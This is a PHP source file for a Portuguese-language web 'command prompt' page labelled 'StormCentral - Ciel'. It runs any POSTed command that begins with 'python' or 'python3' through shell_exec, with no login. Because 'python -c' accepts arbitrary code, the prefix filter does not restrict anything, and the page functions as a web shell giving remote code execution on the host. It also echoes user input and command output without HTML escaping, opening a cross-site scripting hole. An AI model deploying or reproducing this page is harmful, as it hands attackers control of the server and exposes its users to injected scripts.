<?php
// StormCentral - Ciel
if (isset($_POST['command'])) {
    $command = trim($_POST['command']);

    // Verifica se o comando começa exatamente com "python" ou "python3"
    if (preg_match('/^python\s|^python3\s/', $command)) {
        $escaped_command = escapeshellcmd($command);
        $output = shell_exec($escaped_command);
        echo "<pre>$output</pre>";
    } else {
        $output = "Ops... comando não permitido: \"$command\"";
        echo "<pre style='color: red;'>$output</pre>";
    }
}
?>
<!DOCTYPE html>
<html lang="pt">
<head>
    <meta charset="UTF-8">
    <title>Prompt de Comando</title>
    <style>
        body {
            background-color: black;
            color: white;
            font-family: 'Consolas', 'Courier New', Courier, monospace;
            padding: 0;
            margin: 0;
            display: flex;
            align-items: center;
            justify-content: center;
            height: 100vh;
        }
        .terminal-container {
            background-color: black;
            border: 2px solid #00ff00;
            border-radius: 5px;
            padding: 20px;
            max-width: 800px;
            width: 100%;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.5);
        }
        .terminal-title-bar {
            background-color: #333333;
            padding: 5px 10px;
            color: #ffffff;
            display: flex;
            align-items: center;
            justify-content: space-between;
            border-bottom: 2px solid #00ff00;
        }
        .terminal-title-bar .buttons {
            display: flex;
            gap: 5px;
        }
        .terminal-title-bar .buttons span {
            display: block;
            width: 12px;
            height: 12px;
            border-radius: 50%;
        }
        .button-close { background-color: #ff5f56; }
        .button-minimize { background-color: #ffbd2e; }
        .button-maximize { background-color: #27c93f; }
        .terminal-input {
            width: 100%;
            padding: 10px;
            background-color: black;
            border: none;
            color: white;
            font-family: 'Consolas', 'Courier New', Courier, monospace;
            margin-bottom: 10px;
        }
        .terminal-output {
            background-color: black;
            color: white;
            padding: 10px;
            border: 1px solid #00ff00;
            white-space: pre-wrap;
            font-family: 'Consolas', 'Courier New', Courier, monospace;
            height: 300px;
            overflow-y: auto;
        }
        form {
            margin: 0;
        }
        input[type="submit"] {
            display: none;
        }
    </style>
</head>
<body>
    <div class="terminal-container">
        <div class="terminal-title-bar">
            <div>Prompt de Comando</div>
            <div class="buttons">
                <span class="button-close"></span>
                <span class="button-minimize"></span>
                <span class="button-maximize"></span>
            </div>
        </div>
        <form method="post">
            <input type="text" class="terminal-input" name="command" placeholder="Digite um comando Python...">
            <input type="submit" value="Executar">
        </form>
        <?php
        if (isset($output)) {
            echo "<div class='terminal-output'><pre>$output</pre></div>";
        }
        ?>
    </div>
</body>
</html>
